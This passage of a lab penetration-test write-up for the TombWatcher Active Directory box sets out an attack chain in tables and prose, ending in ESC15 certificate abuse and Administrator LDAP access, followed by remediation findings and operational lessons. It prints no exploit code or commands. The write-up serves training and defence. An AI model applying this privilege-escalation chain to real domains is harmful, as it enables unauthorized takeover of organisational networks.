| BloodHound graph PNG | Included as `assets/tombwatcher-bloodhound.png` |
| ADCS OU LDAP security descriptor | In session transcript; explains inherited control |
| Deleted `cert_admin` LDAP LDIF | In session transcript; establishes three different GUIDs |
| Certipy request ID 4 | Correlation ID for CA enrollment logs |
| Administrator LDAP-shell `whoami` | Direct proof of privileged authentication |
| Shadow-credential backup and new PFX | Mentioned workflow; exact filenames/output **not retained** |

**Public-sharing note:** Private passwords, hashes, certificates and flags are not included. The names and filenames are preserved where needed to explain the evidence.

## Impact

The retained terminal evidence confirms Schannel LDAP authentication as TOMBWATCHER\Administrator. Later host access and completion were operator-reported, not independently captured.

### Attack Timeline / Evidence Ledger

| Phase | Action | Observed outcome | Relevant artifact |
|---|---|---|---|
| 01 | Full TCP scan | Domain-controller ports discovered | `scans/full.*` (on operator system) |
| 02 | Authenticate Henry / enumerate shares | Valid domain credentials; shares lacked useful files | NetExec SMB stdout |
| 03 | Enumerate users | Seven accounts | NetExec `--users` stdout |
| 04 | BloodHound pathfinding | Complete chain through ADCS OU | `assets/tombwatcher-bloodhound.png` |
| 05 | Targeted Kerberoast Alfred | TGS hash saved; password recovered | `alfred.tgs` (on operator system) |
| 06 | Add Alfred to Infrastructure | Membership verified | bloodyAD group-membership output |
| 07 | Read gMSA password | `ansible_dev$` hash recovered | NetExec LDAP output |
| 08 | Reset Sam password | Sam SMB authentication successful | NetExec SMB output |
| 09 | Take John's ownership | Original Domain Admins owner replaced by Sam | bloodyAD output |
| 10 | Add GenericAll / reset John | John SMB authentication successful | bloodyAD + NetExec outputs |
| 11 | Inspect ADCS OU ACL | John's inheritable GenericAll verified | bloodyAD security descriptor |
| 12 | Query deleted directory objects | Three `cert_admin` tombstones found | LDAP LDIF |
| 13 | Restore newest cert_admin | RID 1111 reappeared as an active user | bloodyAD object query |
| 14 | Authenticate cert_admin | Account can query LDAP and CA | bloodyAD / Certipy output |
| 15 | Enumerate CA and WebServer | ESC15 prerequisites identified | Certipy `find` stdout |
| 16 | Request crafted certificate | Request ID 4, `administrator.pfx` saved | Certipy `req` stdout |
| 17 | Try PKINIT | Rejected due to client-auth suitability | Certipy `auth` stdout |
| 18 | Try Schannel | Blocked by local OpenSSL weak-digest policy | TLS error + OpenSSL inspection |
| 19 | Apply local OpenSSL config | Schannel Administrator LDAP authentication succeeds | Certipy LDAP shell `whoami` |
| 20 | Host-level post-exploitation | Operator reported completion | Output not retained in chat |

### Conclusion

TombWatcher was a compact but layered Active Directory compromise. The supplied Henry account had no visible direct administrator role, yet its `WriteSPN` permission began a sequence that traversed targeted Kerberoasting, group self-membership, gMSA credential retrieval, delegated password resets, object ownership, ACL inheritance, and restoration of a deleted account. That recovered account was not a Domain Admin; its leverage came from a **misconfigured legacy AD CS template**.

The decisive technical accomplishment was obtaining a crafted Administrator-identity certificate through ESC15 and using **Schannel over LDAPS** to authenticate as `TOMBWATCHER\Administrator`. The failed PKINIT attempt and OpenSSL SHA-1 compatibility issue illustrate why privilege-escalation chains must be interpreted at the level of protocols and individual proof points rather than treated as a single successful command. The operator subsequently reported completing the box; the retained transcript directly proves Domain Administrator LDAP access.

**Final takeaway:** In Active Directory assessments, effective privileges matter more than nominal group membership. Trace delegation paths, verify each boundary, investigate historical directory objects when current-state enumeration runs dry, and prove both certificate *issuance* and *authentication* before declaring impact.

---

#### Technical references (tool documentation only; no machine walkthroughs used)

- [Certipy - Privilege Escalation, ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [Certipy - Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [bloodyAD - User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [Impacket - LDAP shell shadow-credential command reference](https://github.com/fortra/impacket/blob/master/impacket/examples/ldap_shell.py)

*Prepared from the actual CPTS Prep Boxes conversation transcript and the supplied BloodHound screenshot; with technical reference links to upstream tool documentation. No public TombWatcher writeup was consulted.*

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Root Causes and Defensive Remediation

This was an **attack path composed of multiple separate weaknesses**, not one vulnerability permitting immediate Domain Admin access from the starting account.

| Control failure | Why it mattered | Defensive action |
|---|---|---|
| `WriteSPN` from Henry to Alfred | Enabled targeted Kerberoasting of Alfred's password | Remove unnecessary SPN write rights, prefer strong randomly generated passwords, monitor unexpected SPN changes |
| Alfred `AddSelf` on Infrastructure | Turned an ordinary user into a member of a privileged delegation group | Limit self-membership rights, audit sensitive group memberships |
| Infrastructure could read gMSA password | Exposed usable authentication material for `ansible_dev$` | Restrict `PrincipalsAllowedToReadPassword` to indispensable identities, monitor managed-password reads |
| gMSA `ForceChangePassword` on Sam | Allowed account takeover by password reset | Remove unnecessary password-reset delegation; monitor password modifications |
| Sam `WriteOwner` on John | Permitted ownership takeover and subsequent ACL changes | Restrict `WRITE_OWNER` and `WRITE_DACL` on user objects; monitor owner/DACL changes |
| John `GenericAll` on ADCS OU | Enabled control that could flow to descendant objects | Review delegated OU permissions and effective inheritance; enforce least privilege |
| Recoverable deleted `cert_admin` in ADCS OU | Reintroduced an identity with certificate enrollment rights | Audit deleted/recovered privileged identities; tightly control tombstone-restoration privileges |
| `cert_admin` enrollment on V1 WebServer | Allowed requests with enrollee-supplied subject and exposed ESC15 conditions | Apply CVE-2024-49019 patches; migrate/restrict V1 templates; constrain enrollment and subject supply |
| Weak SHA-1 signatures in PKI chain | Triggered OpenSSL compatibility rejection, demonstrating legacy cryptography | Replace weak CA/signature algorithms and certificates; do not lower production TLS policies |
| Schannel certificate authentication accepted impersonated identity | Allowed privileged LDAP access despite limited normal EKU | Harden AD CS, monitor certificate issuance and authentication, review strong certificate mapping and endpoint policies |

#### Reporting-ready finding statements

**F-01 - Excessive AD object delegation enables multi-account takeover.** A chain of `WriteSPN`, group self-membership, gMSA password-read, password-reset, ownership, and ACL permissions allowed the starting account to progress through multiple domain identities. **Impact:** credential exposure, unauthorized password changes, persistent ACL modification, and lateral privilege expansion.

**F-02 - Insufficient OU and deleted-object privilege boundaries enable restored-account takeover.** John's `GenericAll` on `OU=ADCS` and the presence of recoverable `cert_admin` objects with that previous parent enabled resurrection and control of a certificate-enrollment identity. **Impact:** recovery of an identity with access to sensitive AD CS workflows.

**F-03 - Vulnerable AD CS V1 WebServer enrollment permits identity impersonation (ESC15 / CVE-2024-49019).** The CA issued an Administrator-identity certificate to `cert_admin` through a schema V1 template with supplied subject and injected application policy. **Impact:** authenticated Domain Administrator LDAP access via Schannel, directly validated in the lab.

Severity and CVSS scores are deliberately omitted because an accurate scoring exercise would require the engagement's assessment methodology, environmental assumptions, and vulnerability-specific vector justification.

### Operational Lessons / Pitfalls

1. **Make output directories before launching tools.** Nmap's `-oA scans/full` doesn't create `scans/` automatically.
2. **Use the correct tool environment.** A virtual environment under an older project directory is not available by relative path inside a new engagement directory.
3. **Measure Kerberos skew; don't guess.** The earlier `+7h` offset did not apply here. The live DC was ~4 hours ahead.
4. **Parse exact fields.** `/date:/` matched both `date:` and `start_date:`; the resulting corrupted timestamp produced a nonsensical offset.
5. **Don't stop at readable but uninteresting SYSVOL/NETLOGON.** BloodHound object-control relationships exposed the actionable path.
6. **Graph edges are hypotheses until tested.** Each privilege relationship was translated into a directory operation and verified through LDAP/SMB evidence.
7. **Distinguish collection from exploitation.** Reading a gMSA hash was proven directly; plaintext cracking was unnecessary.
8. **Avoid broad ACL modification when narrow control suffices.** `GenericAll` enabled John's password reset but was broader and more persistent than a reset-only ACE; a pre-change DACL backup should have been preserved.
9. **An empty-looking OU may still matter.** Deleted-object enumeration revealed three historical users sharing `lastKnownParent=OU=ADCS`.
10. **Do not confuse same-named deleted objects.** The three `cert_admin` objects had different GUIDs and SIDs; target restoration by exact DN/GUID.
11. **Certificate issuance and certificate authentication are distinct milestones.** Certipy saved `administrator.pfx`, yet PKINIT still failed.
12. **Know the authentication mechanism.** A Server Authentication EKU plus injected application policy was useful through Schannel, not through the attempted PKINIT flow.
13. **Treat TLS compatibility errors as local problems until proven otherwise.** `CA_MD_TOO_WEAK` originated in OpenSSL before the privileged LDAP bind; a process-scoped config addressed it.
14. **Document rollback and evidence contemporaneously.** Ownership changes, ACL grants, password resets, restored objects, issued certificates, and shadow credentials are all changes that require a cleanup ledger.
15. **Maintain a reproducible chain of proof.** The final Administrator LDAP `whoami` is the strongest retained proof; never invent a hash, flag, or WinRM screenshot because the later phase was reported complete.
16. **Wordlists must be appropriately broad.** The Alfred hash cracked to `[REDACTED]`; in other labs, don't prematurely reject a cracking path because a short wordlist fails. Verify hash format and broaden candidates when warranted.
